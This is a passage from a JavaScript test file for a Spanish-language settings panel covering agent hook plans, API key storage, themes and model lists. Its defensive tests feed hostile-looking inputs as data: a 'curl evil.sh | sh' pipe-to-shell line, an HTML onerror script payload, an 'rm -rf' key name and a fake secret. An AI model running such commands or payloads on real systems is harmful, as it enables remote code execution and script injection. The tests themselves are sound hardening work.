  const hidden = [...css.matchAll(/([^{}]*data-settings="open"[^{}]*)\{([^}]*)\}/g)].filter(m => /visibility:\s*hidden/.test(m[2])).map(m => m[1]);
  assert.ok(!hidden.some(sel => /#chat-header/.test(sel)), `a rule hides #chat-header: ${hidden.join(' | ')}`);
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  // the panel must start BELOW the header so both are visible at once
  assert.match(css.slice(css.indexOf('#settings {')), /top:\s*(5\d|6\d)px/);
  assert.ok(html.indexOf('id="chat-header"') < html.indexOf('id="settings"'));
});

// ---- #310: «lento al abrir» — the panel must not claim «Sin motor» before the engine has even been asked -----
test('connecting: no state yet = «Conectando», never the false claim «Sin motor»; the real states keep their words', () => {
  for (const nothing of [null, undefined]) {
    const v = S.connectionView(nothing);
    assert.equal(v.kind, 'connecting'); assert.equal(v.word, 'Conectando'); assert.equal(v.icon, 'ring'); assert.equal(v.tone, 'live');
  }
  assert.equal(S.connectionView({ connection: 'connecting' }).kind, 'connecting');
  assert.equal(S.connectionView({ connection: 'no_daemon' }).word, 'Sin motor', 'a REAL no_daemon still says so');
  assert.equal(S.connectionView({ connection: 'lost' }).word, 'Motor caído');
  assert.equal(S.connectionView({ connection: 'connected' }), null);
  assert.equal(S.connectionView({ connection: 'whatever' }).word, 'Sin motor', 'an unknown state stays the honest default');
});

test('connecting: the lists show a wait («Conectando»), not an empty or «No disponible» result, until the first state arrives', () => {
  assert.equal(S.connectorsView(null).kind, 'loading');
  assert.equal(S.agentsView(null).kind, 'loading');
  assert.equal(S.agentsView(state({ connection: 'connecting', agents: null })).kind, 'loading');
});

test('connecting: the screen draws «Conectando» while the first state is on its way, with a deadline so it can never hang', () => {
  assert.ok(Number.isInteger(S.CONNECT_WAIT_MS) && S.CONNECT_WAIT_MS >= 2000 && S.CONNECT_WAIT_MS <= 10000);
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /CONNECT_WAIT_MS/);
  assert.doesNotMatch(src, /agentState \|\| \{ connection: 'no_daemon'/, 'the stand-in for «no state yet» must not claim the engine is missing');
});

// ---- #310 final contract (H2b): show the plan, send its hash back, refuse a big change, say what to do after Codex ----
const HASH = 'a'.repeat(64);
const plan = (extra = {}) => ({ id: 'claude-code', state: 'not_connected', backup: false, detail: null, plan_hash: HASH,
  summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first.', reviewable: true, trust_review: false, ...extra });
const rowOf = (entry, _id) => S.agentsView(agentsState([entry])).rows.find(r => r.id === entry.id);

test('plan: the closed summary is shown next to the button, and the click carries the hash the human saw', () => {
  const r = rowOf(plan());
  assert.equal(r.primary.label, 'Agregar hooks'); // #436 design (was «Conectar»)
  assert.deepEqual(r.primary.command, { action: 'agent_connect', agentId: 'claude-code', plan_hash: HASH });
  assert.equal(r.summary, 'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo.');
  assert.match(r.aria, /Agrega los hooks/);
  const upd = rowOf(plan({ state: 'outdated', summary: 'Updates the Abito hooks in ~/.claude/settings.json. A backup is made first.' }));
  assert.equal(upd.primary.label, 'Actualizar'); assert.equal(upd.primary.command.plan_hash, HASH);
  assert.equal(upd.summary, 'Actualiza los hooks de Koda en ~/.claude/settings.json. Antes se hace un respaldo.');
  // a disconnect never carries a plan
  assert.deepEqual(rowOf(plan({ state: 'connected' })).secondary.command, { action: 'agent_disconnect', agentId: 'claude-code' });
});

test('Copilot CLI and OpenCode are connectable rows with their own Spanish plan sentence', () => {
  const rows = S.agentsView(agentsState([
    { id: 'copilot-cli', state: 'not_connected', backup: false, detail: null, plan_hash: 'c'.repeat(64), summary: 'Adds the Abito hooks (permissionRequest, sessionEnd) to ~/.copilot/hooks/abito-island.json. A backup is made first.', reviewable: true },
    { id: 'opencode', state: 'not_connected', backup: false, detail: null, plan_hash: 'd'.repeat(64), summary: 'Adds the Abito plugin to ~/.config/opencode/plugins/abito-island.js. A backup is made first.', reviewable: true },
  ])).rows;
  const by = id => rows.find(r => r.id === id);
  assert.equal(by('copilot-cli').name, 'Copilot CLI');
  assert.deepEqual(by('copilot-cli').primary.command, { action: 'agent_connect', agentId: 'copilot-cli', plan_hash: 'c'.repeat(64) });
  assert.equal(by('copilot-cli').summary, 'Agrega los hooks de Koda (permissionRequest, sessionEnd) a ~/.copilot/hooks/abito-island.json. Antes se hace un respaldo.');
  assert.deepEqual(by('opencode').primary.command, { action: 'agent_connect', agentId: 'opencode', plan_hash: 'd'.repeat(64) });
  assert.equal(by('opencode').summary, 'Agrega el plugin de Koda a ~/.config/opencode/plugins/abito-island.js. Antes se hace un respaldo.');
});

test('Pi row depends on extension installation and always names the default directory limitation', () => {
  const view = S.agentsView(agentsState([{id:'pi',state:'connected',backup:false,detail:null}]));
  const r = view.rows.find(row => row.id === 'pi');
  assert(r);
  assert.equal(r.word, 'Instalado en carpeta predeterminada');
  assert.match(r.note, /PI_CODING_AGENT_DIR/);
  assert.deepEqual(r.secondary.command,{action:'agent_disconnect',agentId:'pi'});
});

test('Windows unavailable installer has an explicit state and help, never an action', () => {
  const r = rowOf(plan({state:'unavailable', detail:'unsupported_platform', plan_hash:null, summary:null}));
  assert.equal(r.word, 'No disponible en esta plataforma todavía');
  assert.equal(r.note, 'La instalación automática todavía no está disponible en Windows.');
  assert.equal(r.primary, null);
  assert.equal(r.secondary, null);
  assert.equal(r.helpUrl, 'https://github.com/Alvarogds04/abito#windows-limitations');
});

test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
    'Agrega los hooks de Koda (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
  for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
    const t = S.planSummary(odd);
    assert.equal(t, 'Se van a agregar los hooks de Koda. Antes se hace un respaldo.', `${String(odd).slice(0, 20)} -> generic sentence`);
  }
});

test('plan: no hash means no click that could apply a plan the human did not see', () => {
  for (const bad of [null, undefined, '', 'zz', 'A'.repeat(64), 'a'.repeat(63), 'a'.repeat(65), 7]) {
    const r = rowOf(plan({ plan_hash: bad }));
    assert.equal(r.primary, null, `plan_hash ${JSON.stringify(bad)}: no button`);
    assert.match(r.note, /vista previa|volvé a intentar|recargá/i);
  }
});

test('plan: a change the installer could not show in full is NOT offered as one click', () => {
  const r = rowOf(plan({ reviewable: false, summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.' }));
  assert.equal(r.primary, null, 'no 1-click');
  assert.equal(r.reviewable, false);
  assert.match(r.note, /cambio grande: revisalo en el archivo/i);
  assert.ok(!/terminal|comando/i.test(JSON.stringify(r)));
  // an outdated one that is not reviewable can still be disconnected
  assert.equal(rowOf(plan({ state: 'outdated', reviewable: false })).secondary.label, 'Desconectar');
});

test('details: plan_changed re-shows the NEW plan; audit_unavailable and install_failed render with their own sentences', () => {
  const again = rowOf(plan({ state: 'error', detail: 'plan_changed' }));
  assert.equal(again.word, 'No se pudo');
  assert.match(again.note, /algo cambió desde la vista previa/i);
  assert.match(again.note, /volvé a intentar/i);
  assert.equal(again.primary.label, 'Reintentar');
  assert.equal(again.primary.command.plan_hash, HASH, 'the retry is bound to the NEW plan that came back');
  assert.ok(again.summary, 'the new summary is shown again');
  assert.match(rowOf(plan({ state: 'error', detail: 'audit_unavailable', plan_hash: null, summary: null })).note, /registro|auditor/i);
  // HU-047: Windows refusals say why, in their own sentences.
  assert.match(rowOf(plan({ state: 'error', detail: 'unsafe_target', plan_hash: null, summary: null })).note, /privad|enlace/i);
  assert.match(rowOf(plan({ state: 'error', detail: 'install_unverified', plan_hash: null, summary: null })).note, /verific/i);
  // HU-052: a Pi extension folder Abito did not install gets its own sentence (what to do), never the generic one
  assert.equal(rowOf(plan({ state: 'error', detail: 'foreign_extension', plan_hash: null, summary: null })).note,
    'Ya hay una extensión de Pi en ~/.pi/agent/extensions/abito-island que Koda no instaló: borrala o renombrala y volvé a conectar.');
  // HU-047: the refused folder is named exactly; chmod only for the writable case
  assert.equal(rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: '/home/u/.pi/agent/extensions', folder_reason: 'writable', plan_hash: null, summary: null })).note,
    'La carpeta /home/u/.pi/agent/extensions la puede modificar otro usuario o grupo; quitale el permiso de escritura (chmod g-w,o-w /home/u/.pi/agent/extensions) y volvé a intentar.');
  const foreignNote = rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: '/srv/a b', folder_reason: 'foreign_owner', plan_hash: null, summary: null })).note;
  assert.match(foreignNote, /^La carpeta \/srv\/a b pertenece a otro usuario/); assert.doesNotMatch(foreignNote, /chmod/);
  assert.match(rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: 'C:\\Users\\u\\.pi', folder_reason: 'acl', plan_hash: null, summary: null })).note, /^La carpeta C:\\Users\\u\\\.pi tiene permisos de Windows \(ACL\)/);
  assert.match(rowOf(plan({ state: 'error', detail: 'unsafe_folder', folder: '/x\n', folder_reason: 'writable', plan_hash: null, summary: null })).note, /no es privado/, 'a bad folder falls back to the generic sentence');
  assert.match(rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null })).note, /no se tocó|no se pudo/i);
  // an error without a plan cannot be retried blindly with a stale one
  const noPlan = rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null }));
  assert.equal(noPlan.primary.command.plan_hash, undefined);
  assert.equal(noPlan.primary.label, 'Reintentar');
});

test('trust: after Codex connects the human is told what to do next, in the panel (never a terminal)', () => {
  const r = rowOf({ id: 'codex', state: 'connected', backup: true, detail: null, trust_review: true });
  assert.match(r.note, /confiá en los hooks/i);
  assert.match(r.note, /\/hooks/);
  assert.equal(r.trust, true);
  assert.equal(rowOf({ id: 'codex', state: 'connected', backup: true, detail: null, trust_review: false }).trust, false);
  assert.equal(rowOf({ id: 'claude-code', state: 'connected', backup: false, detail: null, trust_review: true }).trust, true);
});

test('opencode: always «No encontrado», never a button', () => {
  const r = rowOf({ id: 'opencode', state: 'unavailable', backup: false, detail: null });
  assert.equal(r.primary, null); assert.equal(r.secondary, null); assert.equal(r.word, 'No encontrado');
});

test('wiring: the agents group follows the design: «Agentes», hooks asked only on open — never on a timer', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /sectionTitle\('Agentes'\)/, 'the design section label');
  assert.doesNotMatch(src, /Agentes de código/);
  assert.match(src, /action: 'hooks_preview'/, 'the read-only preview is asked with the agents list');
  assert.doesNotMatch(src, /setInterval/, 'no polling: the ask rides the tab opening, not a timer');
});

test('wiring: the plan summary is drawn above the button and the trust hint is its own highlighted line', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /r\.summary[^\n]*splan/);
  assert.match(src, /strust/);
  assert.ok(src.indexOf("r.summary") < src.indexOf("r.primary.label"), 'the summary comes before the button that approves it');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(css, /\.splan\s*\{/); assert.match(css, /\.strust\s*\{/);
});

test('display name validates scalars and controls, blank clears and markup is text', () => {
  assert.equal(S.displayNameProblem(''), '');
  assert.equal(S.displayNameProblem('   '), '');
  assert.equal(S.displayNameProblem('😀'.repeat(80)), '');
  assert.match(S.displayNameProblem('😀'.repeat(81)), /80/);
  assert.match(S.displayNameProblem('A\nB'), /control/);
  assert.match(S.displayNameProblem('A\u007fB'), /control/);
  assert.equal(S.displayNameProblem('<img src=x onerror=alert(1)>'), '');
});

// ---- #384: the Dot's colour, chosen by the human (avatar-colors.js owns the contract) -------------
const A = require(path.join(frontend, 'avatar-colors.js'));

test('#384 colourRows: the principal is always offered, with the five choices and the current one selected', () => {
  const rows = S.colorRows({}, ['abito'], A);
  assert.equal(rows.length, 1);
  const row = rows[0];
  assert.deepEqual([row.id, row.color, row.label], ['abito', 'green', 'Verde']);
  assert.deepEqual(row.options.map(o => o.color), ['green', 'blue', 'mint', 'orange', 'purple']);
  assert.deepEqual(row.options.map(o => o.label), ['Verde', 'Azul', 'Menta', 'Naranja', 'Púrpura']);
  assert.deepEqual(row.options.filter(o => o.selected).map(o => o.color), ['green']);
  assert.match(row.aria, /Verde/);
  for (const o of row.options) assert.match(o.aria, new RegExp(`${o.label} para abito`));
});

test('#384 colourRows: a stored choice is the selected one, and it survives a reload of the prefs view', () => {
  // exactly the shape the host hands back from `prefs_action {action:'view'}`
  const prefs = { sound: false, avatarColors: { abito: 'purple' } };
  const row = S.colorRows(prefs, ['abito'], A)[0];
  assert.deepEqual([row.color, row.label], ['purple', 'Púrpura']);
  assert.deepEqual(row.options.filter(o => o.selected).map(o => o.color), ['purple']);
  assert.ok(row.options.every(o => typeof o.aria === 'string' && o.aria.length > 0), 'every choice has a name');
});

test('#384 colourRows: no sub-Abito list is invented, and an ignored value is never shown as applied', () => {
  assert.equal(S.colorRows({ avatarColors: { abito: 'chartreuse' } }, ['abito'], A)[0].color, 'green');
  assert.deepEqual(S.colorRows({ avatarColors: { codex: 'blue' } }, ['abito', 'pi', 'codex'], A).map(r => r.id), ['abito'],
    'connectors are not colour rows, even if a file names one');
  assert.deepEqual(S.colorRows({}, [], A), []);
  assert.deepEqual(S.colorRows({}, null, A), []);
  assert.deepEqual(S.colorRows({}, undefined, A), []);
  assert.deepEqual(S.colorRows({}, ['abito'], null), [], 'a missing contract is not a broken control');
  assert.deepEqual(S.colorRows({}, ['abito'], {}), []);
});

test('#384 colourRows: repeated colors are valid, with no warning', () => {
  const rows = S.colorRows({ avatarColors: { abito: 'mint' } }, ['abito', 'sub-abito-uno'], A);
  assert.deepEqual(rows.map(r => r.id), ['abito', 'sub-abito-uno']);
  assert.ok(rows.every(r => !Object.hasOwn(r, 'duplicate')));
  assert.doesNotMatch(JSON.stringify(rows), /secret|token|password/i);
  for (const r of rows) assert.equal(r.options.length, A.PALETTE.length);
});

test('#384 controls: every option has visible text, a 44px target and radio keyboard wiring', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(src, /sdot-label', option.label/);
  assert.match(src, /ArrowRight/);
  assert.match(src, /ArrowLeft/);
  assert.match(src, /b.tabIndex = option.selected/);
  assert.match(src, /b.id = `dot-color-\$\{row.id\}-\$\{option.color\}`/, 'existing render restores stable color IDs after prefs events');
  assert.match(css, /\.sdot \{[^}]*min-width: 44px/);
  assert.match(css, /\.sdot \{[^}]*min-height: 44px/);
});

test('#384 F1: failed color save has inline visible feedback and retains the live region', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(src, /sdot-error/);
  assert.match(src, /aria-describedby/);
  assert.match(src, /colorErrors\[identity\] =/);
  assert.match(src, /delete colorErrors\[identity\]/);
  assert.match(src, /say\(colorErrors\[identity\]\)/);
  const rule = css.match(/\.sdot-error \{([^}]*)\}/);
  assert.ok(rule, 'visible error style');
  assert.doesNotMatch(rule[1], /clip|hidden|display:\s*none/);
});

test('#308 owned account snapshots whitelist fields and reveal presence only', () => {
  const input = { accounts: [{ accountId: 'example', provider: 'openai', hasCredential: true,
    config: { nombre: 'Example', baseUrl: 'https://example.com/v1', api: 'openai-completions', compat: {}, models: ['m'], defaultModel: 'm', apiKey: String.fromCharCode(97,98,99) } }] };
  const rows = S.ownedAccounts(input);
  assert.equal(rows.length, 1);
  assert.equal(rows[0].hasCredential, true);
  assert.equal(rows[0].config.defaultModel, 'm');
  assert.equal(Object.hasOwn(rows[0].config, 'apiKey'), false);
  assert.equal(S.ownedAccounts(null).length, 0);
});
test('#308 configuration is not connection readiness and commands are namespaced', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  for (const action of ['abito_account_save', 'abito_account_create', 'abito_account_endpoint_set']) assert.ok(src.includes(action));
  assert.match(src, /Conexión no probada/);
  assert.match(src, /account-secret/);
  assert.match(src, /accountError/);
});
// ---- #380: the theme row of Ajustes (the painting itself lives in theme.js / theme-check) ----------
test('#380 theme: the panel offers exactly the three closed modes from the SAVED prefs, in voseo-free nouns', () => {
  assert.deepEqual([...S.THEME_MODES], ['system', 'light', 'dark']);
  assert.deepEqual(S.themeView({ theme: 'dark' }).options.map(o => o.id), ['system', 'light', 'dark']);
  assert.deepEqual(S.themeView({ theme: 'dark' }).options.filter(o => o.selected).map(o => o.id), ['dark']);
  assert.deepEqual(S.themeView({ theme: 'light' }).options.filter(o => o.selected).map(o => o.id), ['light']);
  // an absent or damaged stored value is «Sistema»: the panel never shows a mode it cannot persist
  assert.equal(S.themeView({}).mode, 'system');
  assert.equal(S.themeView({ theme: 'chartreuse' }).mode, 'system');
  assert.equal(S.themeView(null).mode, 'system');
  for (const option of S.themeView({}).options) assert.ok(option.label && option.aria, option.id);
  assert.equal(S.THEME_LABELS.system, 'Sistema');
  assert.equal(S.THEME_LABELS.light, 'Claro');
  assert.equal(S.THEME_LABELS.dark, 'Oscuro');
});

test('#380 theme wiring: one closed sender, no local paint, and a failed save keeps the old theme in words', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.equal((src.match(/action: 'set_theme'/g) || []).length, 1, 'set_theme is sent through prefs_action only');
  assert.match(src, /\{ action: 'set_theme', theme: mode \}/);
  assert.doesNotMatch(src, /dataset\.theme|data-theme|setAttribute\('data-theme'/, 'only theme.js paints <html data-theme>');
  assert.match(src, /No se pudo guardar el tema; se mantuvo el anterior\./);
  assert.match(src, /const themePick = V\.themeView\(prefs\)/, 'the row renders from the saved prefs, so a refused save re-renders the truth');
  assert.match(src, /role', 'radiogroup'/);
  assert.match(src, /b\.tabIndex = option\.selected \? 0 : -1/, 'roving tabindex, like the colour radios');
  // the picker ships with the page and its styles exist on both palettes
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(css, /\.stheme \{[^}]*min-height: 44px/);
  assert.match(css, /\.stheme\[aria-checked="true"\]/, 'selection is filled + aria-checked, never colour alone');
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  assert.match(html, /<script defer src="theme\.js"><\/script>/);
});

// ---- #414: Ajustes → Modelos, grouped by CONNECTED provider ------------------------------
test('#414 modelsTabView: one group per engine provider, connected ones with their models', () => {
  const state = {
    connection: 'connected',
    providers: [
      { id: 'anthropic', name: 'Anthropic', methods: ['oauth'], configured: true },
      { id: 'openai', name: 'OpenAI', methods: ['oauth', 'api_key'], configured: false },
      { id: 'nan', name: 'NaN', methods: ['api_key'], configured: false },
    ],
    accounts: [{ accountId: 'a1', provider: 'openai', configured: true }],
    models: [
      { provider: 'anthropic', id: 'claude-sonnet-4-5', name: 'Claude Sonnet 4.5', reasoning: true, contextWindow: 200000 },
      { provider: 'anthropic', id: 'claude-opus-4-6', name: 'Claude Opus 4.6', reasoning: true, contextWindow: 200000 },
      { provider: 'openai', id: 'gpt-5.2', name: 'GPT-5.2', reasoning: false, contextWindow: 128000 },
      { provider: 'gone', id: 'x', name: 'X' }, // a model whose provider row disappeared is never shown
    ],
  };
  const v = S.modelsTabView(state, { anthropic: ['claude-opus-4-6'] });
  assert.equal(v.kind, 'ready');
  assert.deepEqual(v.groups.map(g => [g.id, g.connected]), [['anthropic', true], ['openai', true], ['nan', false]], 'one group per provider, engine order');
  const anthropic = v.groups[0];
  assert.deepEqual(anthropic.models.map(m => [m.id, m.name, m.chosen]), [
    ['claude-sonnet-4-5', 'Claude Sonnet 4.5', false],
    ['claude-opus-4-6', 'Claude Opus 4.6', true],
  ], 'the chosen one is marked, others not');
  assert.equal(v.groups[1].models.length, 1, 'a connected provider via a configured account shows its models');
  assert.equal(v.groups[1].models[0].id, 'gpt-5.2');
  // disconnected: one-line hint, no models, never invented ones
  const nan = v.groups[2];
  assert.equal(nan.models, undefined);
  assert.ok(nan.hint.includes('NaN') && nan.hint.includes('Conexiones'), nan.hint);
  assert.ok(!JSON.stringify(v).includes('"x"'), 'a model of an unknown provider never leaks in');
});

test('T7.2 modelsTabView: «Guardado · sin probar» only where the provider\'s ONLY account is a locally saved key', () => {
  const state = {
    connection: 'connected',
    providers: [
      { id: 'anthropic', name: 'Anthropic', methods: ['api_key'], configured: false },
      { id: 'openai', name: 'OpenAI', methods: ['oauth', 'api_key'], configured: true },
      { id: 'both', name: 'Both', methods: ['api_key'], configured: false },
    ],
    accounts: [
      { accountId: 'l1', provider: 'anthropic', local: true, configured: true },
      { accountId: 'a1', provider: 'openai', configured: true },
      { accountId: 'l2', provider: 'both', local: true, configured: true },
      { accountId: 'a2', provider: 'both', configured: true },
    ],
    models: [
      { provider: 'anthropic', id: 'c1', name: 'C1' }, { provider: 'openai', id: 'g1', name: 'G1' }, { provider: 'both', id: 'b1', name: 'B1' },
    ],
  };
  const v = S.modelsTabView(state, {});
  const by = id => v.groups.find(g => g.id === id);
  assert.equal(by('anthropic').connected, true, 'a saved key lists its models');
  assert.equal(by('anthropic').models[0].sub, 'Guardado · sin probar');
  assert.equal(by('openai').models[0].sub, '', 'an engine account stays bare');
  assert.equal(by('both').models[0].sub, '', 'a local key next to an engine account is not the ONLY account');
});

test('#414 modelsTabView: the chosen map arrives only from typed prefs and never marks unknown models', () => {
  const state = { connection: 'connected', providers: [{ id: 'p', name: 'P', methods: ['api_key'], configured: true }], models: [{ provider: 'p', id: 'm1', name: 'M1' }] };
  const v = S.modelsTabView(state, { p: ['other', 'm1'] });
  assert.deepEqual(v.groups[0].models.map(m => m.chosen), [true]);
  assert.equal(S.modelsTabView(state, null).groups[0].models[0].chosen, false, 'no prefs yet = nothing chosen');
  assert.equal(S.modelsTabView(state, 'junk').groups[0].models[0].chosen, false, 'a hostile stored value reads as nothing chosen');
});

test('#414 modelsTabView: no engine or no models yet is honest', () => {
  for (const connection of ['no_daemon', 'lost', 'refused', 'bad_session']) {
    const v = S.modelsTabView({ connection }, {});
    assert.equal(v.kind, 'no_engine', connection);
    assert.ok(v.word && v.icon, connection);
  }
  const waiting = S.modelsTabView(null, {});
  assert.equal(waiting.kind, 'connecting');
  // connected, but the engine has not answered models_list yet: groups render, models empty
  const v = S.modelsTabView({ connection: 'connected', providers: [{ id: 'p', name: 'P', methods: ['oauth'], configured: true }] }, {});
  assert.equal(v.kind, 'ready');
  assert.deepEqual(v.groups[0].models, []);
});

test('#414 chosenToggle: one toggle returns the next map; the payload the page sends carries the whole list', () => {
  const next = S.chosenToggle({ anthropic: ['a1'] }, 'anthropic', 'a2');
  assert.deepEqual(next.anthropic, ['a1', 'a2']);
  assert.deepEqual(S.chosenToggle(next, 'anthropic', 'a1').anthropic, ['a2'], 'a second click removes it');
  const fresh = S.chosenToggle({}, 'openai', 'gpt-5.2');
  assert.deepEqual(fresh.openai, ['gpt-5.2']);
  assert.ok(!Object.hasOwn(S.chosenToggle({ anthropic: ['a1'] }, 'anthropic', 'a1'), 'anthropic'), 'clearing the last model of a provider drops its key');
  // the wire payload: exactly the closed action, provider and its whole list
  const payload = S.chosenModelsPayload({ anthropic: ['a1', 'a2'] }, 'anthropic');
  assert.deepEqual(payload, { action: 'set_chosen_models', provider: 'anthropic', models: ['a1', 'a2'] });
  assert.deepEqual(S.chosenModelsPayload({}, 'anthropic').models, [], 'a cleared provider sends the empty list');
});

// #467 UI wiring: Claves section (secret_action). Presence only, closed key list, our own words for errors.
test('claves: rows follow the closed key list, with OUR labels and presence only', () => {
  assert.equal(S.KEY_IDS.length, 24);
  assert.ok(S.KEY_IDS.includes('anthropic-api-key') && S.KEY_IDS.includes('elevenlabs-api-key'));
  const rows = S.keyRows({ 'anthropic-api-key': true, 'github-token': false });
  assert.deepEqual(rows.map(r => r.id), S.KEY_IDS);
  const a = rows.find(r => r.id === 'anthropic-api-key');
  assert.deepEqual([a.label, a.state, a.word], ['Anthropic', 'present', 'Guardada']);
  assert.equal(rows.find(r => r.id === 'github-token').word, 'Sin definir');
  assert.equal(rows.find(r => r.id === 'vercel-token').state, 'unknown');
  // hostile input never widens the list
  assert.deepEqual(S.keyRows({ 'rm -rf': true }).map(r => r.id), S.KEY_IDS);
});
test('claves: closed payloads, a value only ever travels in set', () => {
  assert.deepEqual(S.keyPayload('present', 'github-token'), { action: 'present', key: 'github-token' });
  assert.deepEqual(S.keyPayload('clear', 'github-token'), { action: 'clear', key: 'github-token' });
  assert.deepEqual(S.keyPayload('set', 'github-token', 'abc'), { action: 'set', key: 'github-token', value: 'abc' });
  assert.equal(S.keyPayload('set', 'github-token', ''), null);
  assert.equal(S.keyPayload('set', 'github-token', 'a\0b'), null);
  assert.equal(S.keyPayload('set', 'github-token', 'x'.repeat(2049)), null);
  assert.equal(S.keyPayload('set', 'nope', 'abc'), null);
  assert.equal(S.keyPayload('delete', 'github-token'), null);
  assert.equal(S.keyPayload('present', 'github-token', 'leak').value, undefined);
});
test('claves: error codes become plain words; no fallback is promised', () => {
  assert.match(S.keyError({ code: 'unavailable' }), /Secret Service|llavero/i);
  assert.match(S.keyError({ code: 'unavailable' }), /no se guardó/i);
  assert.match(S.keyError({ code: 'save_failed' }), /No se pudo guardar/);
  assert.match(S.keyError({ code: 'invalid_schema' }), /no son válid/i);
  assert.match(S.keyError({ code: 'weird', message: 'secret=hunter2' }), /No se pudo/);
  assert.ok(!/hunter2/.test(S.keyError({ code: 'weird', message: 'secret=hunter2' })));
  assert.ok(!/hunter2/.test(S.keyError(new Error('hunter2'))));
});

console.log(`settings-view-check: ${passed} passed`);

test('#408 rail: vertical tablist at the Settings size (Up/Down), wrapping row only as the 400 column fallback', () => {
  assert.equal(S.tabKeyTarget('pills', 'ArrowDown'), 'appearance');
  assert.equal(S.tabKeyTarget('pills', 'ArrowUp'), 'models');
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /setAttribute\('aria-orientation', wide \? 'vertical' : 'horizontal'\)/);
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(css, /#settings\[data-rail="true"\] #settings-tabs\s*\{[^}]*flex-direction:\s*column/);
  assert.match(css, /#settings-tabs\s*\{[^}]*flex-wrap:\s*wrap/, 'the row fallback wraps');
});

test('#408 S9 spacing at the Settings size: wider rail, roomier panel and sections, 2-column cards, tall rail items', () => {
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  const rule = sel => { const i = css.lastIndexOf(sel + ' {'); assert.ok(i >= 0, sel); return css.slice(i, css.indexOf('}', i)); };
  assert.match(rule('#settings[data-rail="true"]'), /grid-template-columns:\s*184px/, 'design §3: rail 184');
  assert.match(rule('#settings[data-rail="true"]'), /padding:\s*20px 24px/);
  assert.match(rule('#settings[data-rail="true"] .ssec'), /margin-top:\s*20px/);
  assert.match(rule('#settings[data-rail="true"] #settings-tabs'), /gap:\s*6px/);
  // design §1/§3: rail tab 36 visual, r10 — the element keeps a 44px hit area and draws the
  // visual tab on its ::after inset layer.
  assert.match(rule('#settings[data-rail="true"] .stab'), /min-height:\s*44px/);
  // #410 r2: the provider cards are gone (the compact list replaced them); the rail keeps its
  // roomier sections, tabs and rows, which the assertions above and below still pin.
  assert.match(rule('#settings[data-rail="true"] .sagent'), /padding:\s*12px 0/);
});

test('#409 T1 the copy-from-Pi surface is gone end to end: no view export, no page/host/module/doc remnant', () => {
  // the view module no longer exports the Pi card/outcome helpers
  assert.equal(S.piConnection, undefined, 'piConnection export removed');
  assert.equal(S.piOutcome, undefined, 'piOutcome export removed');
  const root = path.join(__dirname, '..');
  const read = p => fs.readFileSync(p, 'utf8');
  for (const [name, src] of [['settings-view.js', read(path.join(frontend, 'settings-view.js'))], ['settings.js', read(path.join(frontend, 'settings.js'))]]) {
    for (const gone of ['Usar la conexión de Pi', 'Volver a copiar desde Pi', 'pi_connection', 'importFromPi', 'renderPiCard', 'refreshPi']) {
      assert.ok(!src.includes(gone), `${name} must not contain ${gone}`);
    }
  }
  // host: the command, its registration, the module and its tests are deleted; no store writer left
  assert.ok(!fs.existsSync(path.join(root, 'src', 'piimport.rs')), 'src/piimport.rs deleted');
  assert.ok(!fs.existsSync(path.join(root, 'src', 'piimport_tests.rs')), 'src/piimport_tests.rs deleted');
  for (const [name, gone] of [['main.rs', 'pi_connection'], ['lib.rs', 'piimport'], ['settingshost.rs', 'pi_connection'], ['settingshost.rs', 'piimport'], ['agentclient.rs', 'import_pi_nan'], ['agentclient.rs', 'piimport']]) {
    assert.ok(!read(path.join(root, 'src', name)).includes(gone), `src/${name} must not contain ${gone}`);
  }
  const readme = read(path.join(root, 'README.md'));
  for (const gone of ['Usar la conexión de Pi', 'pi_connection', 'piimport']) {
    assert.ok(!readme.includes(gone), `README.md must not contain ${gone}`);
  }
});

test('#409 T3 docs and source pins: manual editor fields, row removal, and the public checks that pin both', () => {
  const root = path.join(__dirname, '..');
  const read = p => fs.readFileSync(p, 'utf8');
  // S5 documented: deletion is reachable from the owned-account row
  const readme = read(path.join(root, 'README.md'));
  assert.match(readme, /«Quitar conexión»/, 'README documents deletion from the owned-account row');
